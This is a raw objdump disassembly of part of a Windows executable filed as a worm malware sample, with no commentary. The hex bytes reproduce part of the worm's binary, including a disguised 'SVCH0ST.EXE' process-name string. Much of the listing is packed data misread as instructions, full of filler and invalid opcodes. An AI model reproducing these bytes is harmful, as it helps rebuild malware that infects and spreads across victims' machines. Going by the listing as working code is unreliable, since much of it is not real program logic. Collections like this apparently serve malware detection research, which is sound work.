
malware_samples/worm/86852538a2cf05d8b515b9308555dc63a6f32eca91c9a08899f23cdd10938c9a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	32 76 01             	xor    0x1(%esi),%dh
  401003:	00 00                	add    %al,(%eax)
  401005:	05 fe 35 b0 ff       	add    $0xffb035fe,%eax
  40100a:	25 54 10 40 3b       	and    $0x3b401054,%eax
  40100f:	3b 3b                	cmp    (%ebx),%edi
  401011:	8b 80 8c 1c 3b 3b    	mov    0x3b3b1c8c(%eax),%eax
  401017:	3b 3b                	cmp    (%ebx),%edi
  401019:	18 90 78 0c 3b 3b    	sbb    %dl,0x3b3b0c78(%eax)
  40101f:	3b 3b                	cmp    (%ebx),%edi
  401021:	60                   	pusha
  401022:	14 ac                	adc    $0xac,%al
  401024:	bc 3b 3b 3b 3b       	mov    $0x3b3b3b3b,%esp
  401029:	b0 c0                	mov    $0xc0,%al
  40102b:	34 2c                	xor    $0x2c,%al
  40102d:	3b 3b                	cmp    (%ebx),%edi
  40102f:	3b 3b                	cmp    (%ebx),%edi
  401031:	38 94 9c 44 3b 3b 3b 	cmp    %dl,0x3b3b3b44(%esp,%ebx,4)
  401038:	3b 04 b4             	cmp    (%esp,%esi,4),%eax
  40103b:	5c                   	pop    %esp
  40103c:	20 3b                	and    %bh,(%ebx)
  40103e:	3b 3b                	cmp    (%ebx),%edi
  401040:	3b 7c 40 a0          	cmp    -0x60(%eax,%eax,2),%edi
  401044:	74 3b                	je     0x401081
  401046:	3b 3b                	cmp    (%ebx),%edi
  401048:	3b b8 84 4c 28 3b    	cmp    0x3b284c84(%eax),%edi
  40104e:	3b 3b                	cmp    (%ebx),%edi
  401050:	3b 08                	cmp    (%eax),%ecx
  401052:	10 50 24             	adc    %dl,0x24(%eax)
  401055:	3b 3b                	cmp    (%ebx),%edi
  401057:	3b 3b                	cmp    (%ebx),%edi
  401059:	3c 6c                	cmp    $0x6c,%al
  40105b:	70 98                	jo     0x400ff5
  40105d:	3b 3b                	cmp    (%ebx),%edi
  40105f:	3b 3b                	cmp    (%ebx),%edi
  401061:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401062:	30 68 64             	xor    %ch,0x64(%eax)
  401065:	3b 3b                	cmp    (%ebx),%edi
  401067:	3b 3b                	cmp    (%ebx),%edi
  401069:	48                   	dec    %eax
  40106a:	58                   	pop    %eax
  40106b:	00 88 8c 05 c0 3d    	add    %cl,0x3dc0058c(%eax)
  401071:	a8 68                	test   $0x68,%al
  401073:	84 22                	test   %ah,(%edx)
  401075:	f3 b8 1f 03 e8 02    	repz mov $0x2e8031f,%eax
  40107b:	00 01                	add    %al,(%ecx)
  40107d:	eb 30                	jmp    0x4010af
  40107f:	38 c7                	cmp    %al,%bh
  401081:	07                   	pop    %es
  401082:	00 f0                	add    %dh,%al
  401084:	71 34                	jno    0x4010ba
  401086:	45                   	inc    %ebp
  401087:	e5 eb                	in     $0xeb,%eax
  401089:	81 62 45 b9 7f 00 17 	andl   $0x17007fb9,0x45(%edx)
  401090:	1c 4f                	sbb    $0x4f,%al
  401092:	c8 48 01 5e          	enter  $0x148,$0x5e
  401096:	80 2c 80 30          	subb   $0x30,(%eax,%eax,4)
  40109a:	32 30                	xor    (%eax),%dh
  40109c:	34 33                	xor    $0x33,%al
  40109e:	30 49 69             	xor    %cl,0x69(%ecx)
  4010a1:	30 2d 30 00 80 67    	xor    %ch,0x67800030
  4010a7:	49                   	dec    %ecx
  4010a8:	cc                   	int3
  4010a9:	31 00                	xor    %eax,(%eax)
  4010ab:	02 b1 23 bf 4c fd    	add    -0x2b340dd(%ecx),%dh
  4010b1:	8a 1c 45 87 00 00 00 	mov    0x87(,%eax,2),%bl
  4010b8:	00 5f b0             	add    %bl,-0x50(%edi)
  4010bb:	12 cb                	adc    %bl,%cl
  4010bd:	06                   	push   %es
  4010be:	b0 e8                	mov    $0xe8,%al
  4010c0:	60                   	pusha
  4010c1:	ac                   	lods   %ds:(%esi),%al
  4010c2:	d2 59 f5             	rcrb   %cl,-0xb(%ecx)
  4010c5:	e6 df                	out    %al,$0xdf
  4010c7:	4f                   	dec    %edi
  4010c8:	89 f6                	mov    %esi,%esi
  4010ca:	9a c4 9b b9 d6 75 3a 	lcall  $0x3a75,$0xd6b99bc4
  4010d1:	4f                   	dec    %edi
  4010d2:	ad                   	lods   %ds:(%esi),%eax
  4010d3:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  4010d9:	d0 05 2f 01 0c 00    	rolb   $1,0xc012f
  4010df:	aa                   	stos   %al,%es:(%edi)
  4010e0:	00 60 d3             	add    %ah,-0x2d(%eax)
  4010e3:	93                   	xchg   %eax,%ebx
  4010e4:	67 0f 28 27          	movaps (%bx),%xmm4
  4010e8:	e0 e1                	loopne 0x4010cb
  4010ea:	21 0f                	and    %ecx,(%edi)
  4010ec:	05 00 46 6f 72       	add    $0x726f4600,%eax
  4010f1:	6d                   	insl   (%dx),%es:(%edi)
  4010f2:	0d 00 58 00 00       	or     $0x5800,%eax
  4010f7:	01 0b                	add    %ecx,(%ebx)
  4010f9:	00 53 56             	add    %dl,0x56(%ebx)
  4010fc:	43                   	inc    %ebx
  4010fd:	48                   	dec    %eax
  4010fe:	30 53 54             	xor    %dl,0x54(%ebx)
  401101:	2e 45                	cs inc %ebp
  401103:	58                   	pop    %eax
  401104:	45                   	inc    %ebp
  401105:	00 03                	add    %al,(%ebx)
  401107:	e0 00                	loopne 0x401109
  401109:	0a 01                	or     (%ecx),%al
  40110b:	d4 05                	aam    $0x5
  40110d:	70 6d                	jo     0x40117c
  40110f:	19 42 00             	sbb    %eax,0x0(%edx)
  401112:	22 00                	and    (%eax),%al
  401114:	23 c6                	and    %esi,%eax
  401116:	0e                   	push   %cs
  401117:	e6 b1                	out    %al,$0xb1
  401119:	18 16                	sbb    %dl,(%esi)
  40111b:	6c                   	insb   (%dx),%es:(%edi)
  40111c:	74 be                	je     0x4010dc
  40111e:	00 e8                	add    %ch,%al
  401120:	58                   	pop    %eax
  401121:	9c                   	pushf
  401122:	ec                   	in     (%dx),%al
  401123:	01 60 08             	add    %esp,0x8(%eax)
  401126:	39 72 5a             	cmp    %esi,0x5a(%edx)
  401129:	1c 00                	sbb    $0x0,%al
  40112b:	a8 0e                	test   $0xe,%al
  40112d:	16                   	push   %ss
  40112e:	28 60 b3             	sub    %ah,-0x4d(%eax)
  401131:	6f                   	outsl  %ds:(%esi),(%dx)
  401132:	b9 60 08 d1 01       	mov    $0x1d10860,%ecx
  401137:	2c fb                	sub    $0xfb,%al
  401139:	ff 00                	incl   (%eax)
  40113b:	9c                   	pushf
  40113c:	79 0e                	jns    0x40114c
  40113e:	cb                   	lret
  40113f:	63 a5 ad b5 e7 79    	arpl   %esp,0x79e7b5ad(%ebp)
  401145:	9e                   	sahf
  401146:	e7 bd                	out    %eax,$0xbd
  401148:	c6                   	(bad)
  401149:	ce                   	into
  40114a:	d6                   	salc
  40114b:	de 8f e3 79 9e e7    	fimuls -0x1861861d(%edi)
  401151:	ef                   	out    %eax,(%dx)
  401152:	f7 8c fb 94 77 f1 2c 	testl  $0xef7bad3c,0x2cf17794(%ebx,%edi,8)
  401159:	3c ad 7b ef 
  40115d:	f7 f7                	div    %edi
  40115f:	e2 70                	loop   0x4011d1
  401161:	38 cf                	cmp    %cl,%bh
  401163:	fb                   	sti
  401164:	fb                   	sti
  401165:	84 f3                	test   %dh,%bl
  401167:	8c f3                	mov    %?,%ebx
  401169:	9c                   	pushf
  40116a:	f1                   	int1
  40116b:	38 9e d7 a5 b5 f7    	cmp    %bl,-0x84a5a29(%esi)
  401171:	d6                   	salc
  401172:	73 e7                	jae    0x40115b
  401174:	3c 0e                	cmp    $0xe,%al
  401176:	87 67 84             	xchg   %esp,-0x7c(%edi)
  401179:	ef                   	out    %eax,(%dx)
  40117a:	9c                   	pushf
  40117b:	f3 de 4a 75          	repz fimuls 0x75(%edx)
  40117f:	0e                   	push   %cs
  401180:	ff 02                	incl   (%edx)
  401182:	cf                   	iret
  401183:	e7 00                	out    %eax,$0x0
  401185:	63 db                	arpl   %ebx,%ebx
  401187:	ef                   	out    %eax,(%dx)
  401188:	eb ff                	jmp    0x401189
  40118a:	5a                   	pop    %edx
  40118b:	1c bf                	sbb    $0xbf,%al
  40118d:	e5 8c                	in     $0x8c,%eax
  40118f:	ad                   	lods   %ds:(%esi),%eax
  401190:	f3 5a                	repz pop %edx
  401192:	79 dd                	jns    0x401171
  401194:	75 f1                	jne    0x401187
  401196:	6b df 9c             	imul   $0xffffff9c,%edi,%ebx
  401199:	38 1c 87             	cmp    %bl,(%edi,%eax,4)
  40119c:	e5 a5                	in     $0xa5,%eax
  40119e:	b5 f3                	mov    $0xf3,%ch
  4011a0:	ce                   	into
  4011a1:	f7 e7                	mul    %edi
  4011a3:	b8 50 66 70 fb       	mov    $0xfb706650,%eax
  4011a8:	39 be de c7 7b 6c    	cmp    %edi,0x6c7bc7de(%esi)
  4011ae:	3c ef                	cmp    $0xef,%al
  4011b0:	84 e7                	test   %ah,%bh
  4011b2:	9d                   	popf
  4011b3:	3c 96                	cmp    $0x96,%al
  4011b5:	fe ce                	dec    %dh
  4011b7:	87 85 6d f1 29 b6    	xchg   %eax,-0x49d60e93(%ebp)
  4011bd:	31 ba 1c 16 d3 02    	xor    %edi,0x2d3161c(%edx)
  4011c3:	9e                   	sahf
  4011c4:	bd 00 52 cf 5a       	mov    $0x5acf5200,%ebp
  4011c9:	63 e7                	arpl   %esp,%edi
  4011cb:	39 e1                	cmp    %esp,%ecx
  4011cd:	5a                   	pop    %edx
  4011ce:	d7                   	xlat   %ds:(%ebx)
  4011cf:	6b d3 e3             	imul   $0xffffffe3,%ebx,%edx
  4011d2:	75 f2                	jne    0x4011c6
  4011d4:	9c                   	pushf
  4011d5:	17                   	pop    %ss
  4011d6:	7b 8c                	jnp    0x401164
  4011d8:	ad                   	lods   %ds:(%esi),%eax
  4011d9:	16                   	push   %ss
  4011da:	5e                   	pop    %esi
  4011db:	13 c7                	adc    %edi,%eax
  4011dd:	b5 ef                	mov    $0xef,%ch
  4011df:	c6 00 9e             	movb   $0x9e,(%eax)
  4011e2:	ce                   	into
  4011e3:	c7                   	(bad)
  4011e4:	49                   	dec    %ecx
  4011e5:	67 18 96 c6 80       	sbb    %dl,-0x7f3a(%bp)
  4011ea:	63 09                	arpl   %ecx,(%ecx)
  4011ec:	87 08                	xchg   %ecx,(%eax)
  4011ee:	92                   	xchg   %eax,%edx
  4011ef:	bd 8a b5 a6 d6       	mov    $0xd6a6b58a,%ebp
  4011f4:	00 18                	add    %bl,(%eax)
  4011f6:	aa                   	stos   %al,%es:(%edi)
  4011f7:	13 b8 48 e7 41 00    	adc    0x41e748(%eax),%edi
  4011fd:	50                   	push   %eax
  4011fe:	64 ff 35 00 00 00 00 	push   %fs:0x0
  401205:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40120c:	33 c0                	xor    %eax,%eax
  40120e:	89 08                	mov    %ecx,(%eax)
  401210:	20 20                	and    %ah,(%eax)
  401212:	20 20                	and    %ah,(%eax)
  401214:	20 20                	and    %ah,(%eax)
  401216:	20 20                	and    %ah,(%eax)
  401218:	20 20                	and    %ah,(%eax)
  40121a:	00 26                	add    %ah,(%esi)
  40121c:	87 bb 84 a5 6f e2    	xchg   %edi,-0x1d905a7c(%ebx)
  401222:	9d                   	popf
  401223:	38 e3                	cmp    %ah,%bl
  401225:	f7 df                	neg    %edi
  401227:	bd de 1b cb a2       	mov    $0xa2cb1bde,%ebp
  40122c:	eb de                	jmp    0x40120c
  40122e:	6f                   	outsl  %ds:(%esi),(%dx)
  40122f:	f2 1c 27             	repnz sbb $0x27,%al
  401232:	00 9a 92 8e 27 5c    	add    %bl,0x5c278e92(%edx)
  401238:	97                   	xchg   %eax,%edi
  401239:	83 10 a2             	adcl   $0xffffffa2,(%eax)
  40123c:	d6                   	salc
  40123d:	10 7d a5             	adc    %bh,-0x5b(%ebp)
  401240:	1e                   	push   %ds
  401241:	d7                   	xlat   %ds:(%ebx)
  401242:	e5 1c                	in     $0x1c,%eax
  401244:	de 21                	fisubs (%ecx)
  401246:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401247:	38 c1                	cmp    %al,%cl
  401249:	71 38                	jno    0x401283
  40124b:	79 9c                	jns    0x4011e9
  40124d:	a2 ce ae 21 8a       	mov    %al,0x8a21aece
  401252:	ad                   	lods   %ds:(%esi),%eax
  401253:	79 af                	jns    0x401204
  401255:	e7 c4                	out    %eax,$0xc4
  401257:	b6 39                	mov    $0x39,%dh
  401259:	05 cf c4 61 42       	add    $0x4261c4cf,%eax
  40125e:	c3                   	ret
  40125f:	29 79 94             	sub    %edi,-0x6c(%ecx)
  401262:	65 f9                	gs stc
  401264:	6d                   	insl   (%dx),%es:(%edi)
  401265:	8e 4a 65             	mov    0x65(%edx),%cs
  401268:	db 1e                	fistpl (%esi)
  40126a:	cb                   	lret
  40126b:	4a                   	dec    %edx
  40126c:	38 1c 36             	cmp    %bl,(%esi,%esi,1)
  40126f:	b6 52                	mov    $0x52,%dh
  401271:	39 7d 94             	cmp    %edi,-0x6c(%ebp)
  401274:	c3                   	ret
  401275:	7b 8e                	jnp    0x401205
  401277:	f8                   	clc
  401278:	cc                   	int3
  401279:	d7                   	xlat   %ds:(%ebx)
  40127a:	ff                   	(bad)
  40127b:	38 7a 36             	cmp    %bh,0x36(%edx)
  40127e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40127f:	63 db                	arpl   %ebx,%ebx
  401281:	6b f1 1f             	imul   $0x1f,%ecx,%esi
  401284:	39 ce                	cmp    %ecx,%esi
  401286:	73 7b                	jae    0x401303
  401288:	cb                   	lret
  401289:	95                   	xchg   %eax,%ebp
  40128a:	ff f6                	push   %esi
  40128c:	9c                   	pushf
  40128d:	9c                   	pushf
  40128e:	5c                   	pop    %esp
  40128f:	67 1c a7             	addr16 sbb $0xa7,%al
  401292:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401293:	e7 a5                	out    %eax,$0xa5
  401295:	ef                   	out    %eax,(%dx)
  401296:	c3                   	ret
  401297:	e2 78                	loop   0x401311
  401299:	ac                   	lods   %ds:(%esi),%al
  40129a:	21 aa 29 78 6d 0e    	and    %ebp,0xe6d7829(%edx)
  4012a0:	8e 42 b2             	mov    -0x4e(%edx),%es
  4012a3:	52                   	push   %edx
  4012a4:	c7                   	(bad)
  4012a5:	f7 63 d3             	mull   -0x2d(%ebx)
  4012a8:	8b 8e fb af c7 b5    	mov    -0x4a385005(%esi),%ecx
  4012ae:	f4                   	hlt
  4012af:	4c                   	dec    %esp
  4012b0:	8c 73 87             	mov    %?,-0x79(%ebx)
  4012b3:	95                   	xchg   %eax,%ebp
  4012b4:	d3 e4                	shl    %cl,%esp
  4012b6:	7b 84                	jnp    0x40123c
  4012b8:	1f                   	pop    %ds
  4012b9:	bd 46 3c 8c 9c       	mov    $0x9c8c3c46,%ebp
  4012be:	d7                   	xlat   %ds:(%ebx)
  4012bf:	cd 13                	int    $0x13
  4012c1:	cf                   	iret
  4012c2:	73 c6                	jae    0x40128a
  4012c4:	d6                   	salc
  4012c5:	63 cf                	arpl   %ecx,%edi
  4012c7:	7d 56                	jge    0x40131f
  4012c9:	9e                   	sahf
  4012ca:	2b db                	sub    %ebx,%ebx
  4012cc:	c8 7f e2 bd          	enter  $0xe27f,$0xbd
  4012d0:	4a                   	dec    %edx
  4012d1:	be cb 3b f9 de       	mov    $0xdef93bcb,%esi
  4012d6:	69 ad fe 23 cf e5 ce 	imul   $0xef8ee7ce,-0x1a30dc02(%ebp),%ebp
  4012dd:	e7 8e ef 
  4012e0:	72 5b                	jb     0x40133d
  4012e2:	bd de d6 ef ca       	mov    $0xcaefd6de,%ebp
  4012e7:	3f                   	aas
  4012e8:	f9                   	stc
  4012e9:	2c ef                	sub    $0xef,%al
  4012eb:	f7 77 c4             	divl   -0x3c(%edi)
  4012ee:	ad                   	lods   %ds:(%esi),%eax
  4012ef:	7d 3b                	jge    0x40132c
  4012f1:	02 16                	add    (%esi),%dl
  4012f3:	55                   	push   %ebp
  4012f4:	6c                   	insb   (%dx),%es:(%edi)
  4012f5:	00 ee                	add    %ch,%dh
  4012f7:	e6 05                	out    %al,$0x5
  4012f9:	ac                   	lods   %ds:(%esi),%al
  4012fa:	5b                   	pop    %ebx
  4012fb:	71 7e                	jno    0x40137b
  4012fd:	62 5b 46             	bound  %ebx,0x46(%ebx)
  401300:	17                   	pop    %ss
  401301:	bb 0e 00 5b 63       	mov    $0x635b000e,%ebx
  401306:	7d 92                	jge    0x40129a
  401308:	96                   	xchg   %eax,%esi
  401309:	83 68 61 5b          	subl   $0x5b,0x61(%eax)
  40130d:	5d                   	pop    %ebp
  40130e:	64 5b                	fs pop %ebx
  401310:	66 0b 08             	or     (%eax),%cx
  401313:	58                   	pop    %eax
  401314:	78 92                	js     0x4012a8
  401316:	91                   	xchg   %eax,%ecx
  401317:	6e                   	outsb  %ds:(%esi),(%dx)
  401318:	4b                   	dec    %ebx
  401319:	42                   	inc    %edx
  40131a:	5c                   	pop    %esp
  40131b:	60                   	pusha
  40131c:	cb                   	lret
  40131d:	f7 56 cd             	notl   -0x33(%esi)
  401320:	74 0f                	je     0x401331
  401322:	e6 65                	out    %al,$0x65
  401324:	01 85 47 5b 6c c3    	add    %eax,-0x3c93a4b9(%ebp)
  40132a:	03 16                	add    (%esi),%edx
  40132c:	ec                   	in     (%dx),%al
  40132d:	5b                   	pop    %ebx
  40132e:	80 40 88 53          	addb   $0x53,-0x78(%eax)
  401332:	53                   	push   %ebx
  401333:	74 ef                	je     0x401324
  401335:	3d 5f 6e 38 1b       	cmp    $0x1b386e5f,%eax
  40133a:	58                   	pop    %eax
  40133b:	78 58                	js     0x401395
  40133d:	77 53                	ja     0x401392
  40133f:	54                   	push   %esp
  401340:	ef                   	out    %eax,(%dx)
  401341:	f9                   	stc
  401342:	e6 05                	out    %al,$0x5
  401344:	54                   	push   %esp
  401345:	70 4e                	jo     0x401395
  401347:	4a                   	dec    %edx
  401348:	42                   	inc    %edx
  401349:	50                   	push   %eax
  40134a:	67 03 0b             	add    (%bp,%di),%ecx
  40134d:	8f                   	(bad)
  40134e:	53                   	push   %ebx
  40134f:	54                   	push   %esp
  401350:	3a 6b 7c             	cmp    0x7c(%ebx),%ch
  401353:	cf                   	iret
  401354:	05 2f 4b 5e 3c       	add    $0x3c5e4b2f,%eax
  401359:	c1 8b 35 b0 75 39 58 	rorl   $0x58,0x3975b035(%ebx)
  401360:	1f                   	pop    %ds
  401361:	de 5b 41             	ficomps 0x41(%ebx)
  401364:	3e 3c 95             	ds cmp $0x95,%al
  401367:	d6                   	salc
  401368:	c0 c2 eb             	rol    $0xeb,%dl
  40136b:	56                   	push   %esi
  40136c:	32 31                	xor    (%ecx),%dh
  40136e:	80 7b ab f7          	cmpb   $0xf7,-0x55(%ebx)
  401372:	80 93 32 28 c3 8b 35 	adcb   $0x35,-0x743cd7ce(%ebx)
  401379:	b0 91                	mov    $0x91,%al
  40137b:	5b                   	pop    %ebx
  40137c:	06                   	push   %es
  40137d:	16                   	push   %ss
  40137e:	7a ef                	jp     0x40136f
  401380:	29 1d 58 d0 bd b7    	sub    %ebx,0xb7bdd058
  401386:	7c 25                	jl     0x4013ad
  401388:	23 a8 de c5 1a 91    	and    -0x6ee53a22(%eax),%ebp
  40138e:	4b                   	dec    %ebx
  40138f:	81 de 5b 03 0b 81    	sbb    $0x810b035b,%esi
  401395:	79 2b                	jns    0x4013c2
  401397:	17                   	pop    %ss
  401398:	58                   	pop    %eax
  401399:	03 0b                	add    (%ebx),%ecx
  40139b:	b8 69 69 78 1a       	mov    $0x1a786969,%eax
  4013a0:	13 91 26 58 1c ff    	adc    -0xe3a7da(%ecx),%edx
  4013a6:	5d                   	pop    %ebp
  4013a7:	4f                   	dec    %edi
  4013a8:	84 84 10 79 70 c2 1a 	test   %al,0x1ac27079(%eax,%edx,1)
  4013af:	91                   	xchg   %eax,%ecx
  4013b0:	3b 4d 3f             	cmp    0x3f(%ebp),%ecx
  4013b3:	de 47 ef             	fiadds -0x11(%edi)
  4013b6:	2c 24                	sub    $0x24,%al
  4013b8:	49                   	dec    %ecx
  4013b9:	85 35 b0 c0 86 86    	test   %esi,0x8686c0b0
  4013bf:	6d                   	insl   (%dx),%es:(%edi)
  4013c0:	15 03 91 18 45       	adc    $0x45189103,%eax
  4013c5:	e3 7d                	jecxz  0x401444
  4013c7:	f0 df 73 87          	lock fbstp -0x79(%ebx)
  4013cb:	6a 1b                	push   $0x1b
  4013cd:	09 5b 6b             	or     %ebx,0x6b(%ebx)
  4013d0:	60                   	pusha
  4013d1:	71 fc                	jno    0x4013cf
  4013d3:	7b 8a                	jnp    0x40135f
  4013d5:	04 16                	add    $0x16,%al
  4013d7:	f8                   	clc
  4013d8:	c7                   	(bad)
  4013d9:	7b 44                	jnp    0x40141f
  4013db:	97                   	xchg   %eax,%edi
  4013dc:	8a 44 2d 05          	mov    0x5(%ebp,%ebp,1),%al
  4013e0:	d5 bb                	aad    $0xbb
  4013e2:	b0 06                	mov    $0x6,%al
  4013e4:	91                   	xchg   %eax,%ecx
  4013e5:	0a 69 82             	or     -0x7e(%ecx),%ch
  4013e8:	1f                   	pop    %ds
  4013e9:	b0 00                	mov    $0x0,%al
  4013eb:	8b 44 7f 09          	mov    0x9(%edi,%edi,2),%eax
  4013ef:	07                   	pop    %es
  4013f0:	06                   	push   %es
  4013f1:	91                   	xchg   %eax,%ecx
  4013f2:	0b 51 72             	or     0x72(%ecx),%edx
  4013f5:	0b 00                	or     (%eax),%eax
  4013f7:	f0 ef                	lock out %eax,(%dx)
  4013f9:	93                   	xchg   %eax,%ebx
  4013fa:	2a 44 52 99          	sub    -0x67(%edx,%edx,2),%al
  4013fe:	7f 7f                	jg     0x40147f
  401400:	2d 1f 1b 09 09       	sub    $0x9091b1f,%eax
  401405:	08 07                	or     %al,(%edi)
  401407:	0f de 53 01          	pmaxub 0x1(%ebx),%mm2
  40140b:	30 4f 6c             	xor    %cl,0x6c(%edi)
  40140e:	65 bd 00 b0 98 2a    	gs mov $0x2a98b000,%ebp
  401414:	27                   	daa
  401415:	35 5b 44 6a 89       	xor    $0x896a445b,%eax
  40141a:	7b 94                	jnp    0x4013b0
  40141c:	9a 08 fe 5d f0 81 91 	lcall  $0x9181,$0xf05dfe08
  401423:	0c 33                	or     $0x33,%al
  401425:	67 7a 81             	addr16 jp 0x4013a9
  401428:	c9                   	leave
  401429:	14 90                	adc    $0x90,%al
  40142b:	1e                   	push   %ds
  40142c:	22 27                	and    (%edi),%ah
  40142e:	2f                   	das
  40142f:	35 48 10 36 b0       	xor    $0xb0361048,%eax
  401434:	80 50 59 0d          	adcb   $0xd,0x59(%eax)
  401438:	0a 09                	or     (%ecx),%cl
  40143a:	91                   	xchg   %eax,%ecx
  40143b:	0d 3f 21 de f3       	or     $0xf3de213f,%eax
  401440:	c0 19 05             	rcrb   $0x5,(%ecx)
  401443:	bc b0 d8 1c 38       	mov    $0x381cd8b0,%esp
  401448:	44                   	inc    %esp
  401449:	0b 3f                	or     (%edi),%edi
  40144b:	bc b7 81 90 43       	mov    $0x439081b7,%esp
  401450:	01 3c 7e             	add    %edi,(%esi,%edi,2)
  401453:	85 5a 11             	test   %ebx,0x11(%edx)
  401456:	2f                   	das
  401457:	44                   	inc    %esp
  401458:	9e                   	sahf
  401459:	0e                   	push   %cs
  40145a:	0e                   	push   %cs
  40145b:	0d 0d 0c 8a b3       	or     $0xb38a0c0d,%eax
  401460:	2c 60                	sub    $0x60,%al
  401462:	91                   	xchg   %eax,%ecx
  401463:	b3 43                	mov    $0x43,%bl
  401465:	f0 c0 5b 9a 05       	lock rcrb $0x5,-0x66(%ebx)
  40146a:	9c                   	pushf
  40146b:	c0 02 40             	rolb   $0x40,(%edx)
  40146e:	2e 5f                	cs pop %edi
  401470:	6a 3d                	push   $0x3d
  401472:	8c 8e 9c 01 01 0e    	mov    %cs,0xe01019c(%esi)
  401478:	0d f9 ef 22 59       	or     $0x5922eff9,%eax
  40147d:	91                   	xchg   %eax,%ecx
  40147e:	5f                   	pop    %edi
  40147f:	14 60                	adc    $0x60,%al
  401481:	2f                   	das
  401482:	00 de                	add    %bl,%dh
  401484:	04 03                	add    $0x3,%al
  401486:	12 21                	adc    (%ecx),%ah
  401488:	20 36                	and    %dh,(%esi)
  40148a:	4a                   	dec    %edx
  40148b:	5b                   	pop    %ebx
  40148c:	5b                   	pop    %ebx
  40148d:	4c                   	dec    %esp
  40148e:	8d 8e bf 0b 61 71    	lea    0x71610bbf(%esi),%ecx
  401494:	7f 90                	jg     0x401426
  401496:	6a 58                	push   $0x58
  401498:	2b b8 c3 8d 2d 05    	sub    0x52d8dc3(%eax),%edi
  40149e:	2d 7f 0b f1 42       	sub    $0x42f10b7f,%eax
  4014a3:	cd 0f                	int    $0xf
  4014a5:	1c 87                	sbb    $0x87,%al
  4014a7:	00 0b                	add    %cl,(%ebx)
  4014a9:	db 82 44 ac 77 a1    	fildl  -0x5e8853bc(%edx)
  4014af:	02 9a 08 2d 5e 00    	add    0x5e2d08(%edx),%bl
  4014b5:	d8 0a                	fmuls  (%edx)
  4014b7:	59                   	pop    %ecx
  4014b8:	6a 6f                	push   $0x6f
  4014ba:	7a 9d                	jp     0x401459
  4014bc:	9f                   	lahf
  4014bd:	9f                   	lahf
  4014be:	1f                   	pop    %ds
  4014bf:	0a 08                	or     (%eax),%cl
  4014c1:	06                   	push   %es
  4014c2:	70 fd                	jo     0x4014c1
  4014c4:	cb                   	lret
  4014c5:	c0 16 1c             	rclb   $0x1c,(%esi)
  4014c8:	5b                   	pop    %ebx
  4014c9:	7a 0d                	jp     0x4014d8
  4014cb:	fc                   	cld
  4014cc:	16                   	push   %ss
  4014cd:	94                   	xchg   %eax,%esp
  4014ce:	bb 0a 9a 65 5b       	mov    $0x5b659a0a,%ebx
  4014d3:	80 11 10             	adcb   $0x10,(%ecx)
  4014d6:	b0 6a                	mov    $0x6a,%al
  4014d8:	78 7a                	js     0x401554
  4014da:	57                   	push   %edi
  4014db:	9b                   	fwait
  4014dc:	0d 17 38 10 0b       	or     $0xb103817,%eax
  4014e1:	44                   	inc    %esp
  4014e2:	5f                   	pop    %edi
  4014e3:	9e                   	sahf
  4014e4:	99                   	cltd
  4014e5:	60                   	pusha
  4014e6:	46                   	inc    %esi
  4014e7:	c6                   	(bad)
  4014e8:	09 7d cb             	or     %edi,-0x35(%ebp)
  4014eb:	99                   	cltd
  4014ec:	e0 08                	loopne 0x4014f6
  4014ee:	01 50 cb             	add    %edx,-0x35(%eax)
  4014f1:	5b                   	pop    %ebx
  4014f2:	82 1b a6             	sbbb   $0xa6,(%ebx)
  4014f5:	19 7c 96 63          	sbb    %edi,0x63(%esi,%edx,4)
  4014f9:	82 76 55 5f          	xorb   $0x5f,0x55(%esi)
  4014fd:	f2 44                	repnz inc %esp
  4014ff:	38 34 8c             	cmp    %dh,(%esp,%ecx,4)
  401502:	5b                   	pop    %ebx
  401503:	ff 75 1c             	push   0x1c(%ebp)
  401506:	b8 37 00 ee 8e       	mov    $0x8eee0037,%eax
  40150b:	65 47                	gs inc %edi
  40150d:	ff 00                	incl   (%eax)
  40150f:	dd cf                	(bad)
  401511:	0f 3e                	(bad)
  401513:	07                   	pop    %es
  401514:	fe 00                	incb   (%eax)
  401516:	7f 07                	jg     0x40151f
  401518:	dd cf                	(bad)
  40151a:	8f 03                	pop    (%ebx)
  40151c:	07                   	pop    %es
  40151d:	cf                   	iret
  40151e:	cf                   	iret
  40151f:	8f 03                	pop    (%ebx)
  401521:	07                   	pop    %es
  401522:	03 ba f3 bc ce 01    	add    0x1cebcf3(%edx),%edi
  401528:	fc                   	cld
  401529:	00 b9 3f bf 8f 7f    	add    %bh,0x7f8fbf3f(%ecx)
  40152f:	3f                   	aas
  401530:	ed                   	in     (%dx),%eax
  401531:	58                   	pop    %eax
  401532:	dc 3f                	fdivrl (%edi)
  401534:	03 cc                	add    %esp,%ecx
  401536:	8e 05 c2 07 f8 07    	mov    0x7f807c2,%es
  40153c:	0f df b1 c2 ff c0 1f 	pandn  0x1fc0ffc2(%ecx),%mm6
  401543:	c7 43 c6 c7 ff 24 04 	movl   $0x424ffc7,-0x3a(%ebx)
  40154a:	d0 43 84             	rolb   $1,-0x7c(%ebx)
  40154d:	26 00 27             	add    %ah,%es:(%edi)
  401550:	2e 00 32             	add    %dh,%cs:(%edx)
  401553:	00 35 64 86 4c f2    	add    %dh,0xf24c8664
  401559:	34 05                	xor    $0x5,%al
  40155b:	07                   	pop    %es
  40155c:	7b 88                	jnp    0x4014e6
  40155e:	d0 02                	rolb   $1,(%edx)
  401560:	41                   	inc    %ecx
  401561:	00 44 67 20          	add    %al,0x20(%edi,%eiz,2)
  401565:	47                   	inc    %edi
  401566:	c8 01 1f 80          	enter  $0x1f01,$0x80
  40156a:	b9 00 5a 06 00       	mov    $0x65a00,%ecx
  40156f:	54                   	push   %esp
  401570:	69 6d 65 72 0b 03 88 	imul   $0x88030b72,0x65(%ebp),%ebp
  401577:	13 9f e1 c8 ae a0    	adc    -0x5f51371f(%edi),%ebx
  40157d:	05 08 78 f9 d1       	add    $0xd1f97808,%eax
  401582:	b7 88                	mov    $0x88,%bh
  401584:	03 02                	add    (%edx),%eax
  401586:	31 b3 50 c7 e3 f4    	xor    %esi,-0xb1c38b0(%ebx)
  40158c:	01 f0                	add    %esi,%eax
  40158e:	00 02                	add    %al,(%edx)
  401590:	04 ec                	add    $0xec,%al
  401592:	30 e8                	xor    %ch,%al
